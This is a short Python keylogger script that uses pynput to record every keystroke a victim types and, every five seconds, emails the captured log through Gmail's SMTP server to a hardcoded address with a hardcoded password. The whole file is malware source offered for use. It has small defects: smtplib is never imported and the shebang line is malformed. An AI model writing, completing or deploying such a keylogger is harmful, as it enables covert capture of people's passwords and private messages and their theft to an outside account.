#!usr/bin/env python

import pynput.keyboard , threading

log = ""

def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "
    except KeyboardInterrupt:
        log = log + "  KeyboardInterrupt  "
    print(log)


def send_male(email, password, massage):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, massage)
    server.quit()

def report():
    global log
    send_male("wejhoon@gmail.com", "HackerEmail", log)
    print(log)
    log = ""
    timer = threading.Timer(5, report)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)

with keyboard_listener:
    report()
    keyboard_listener.join()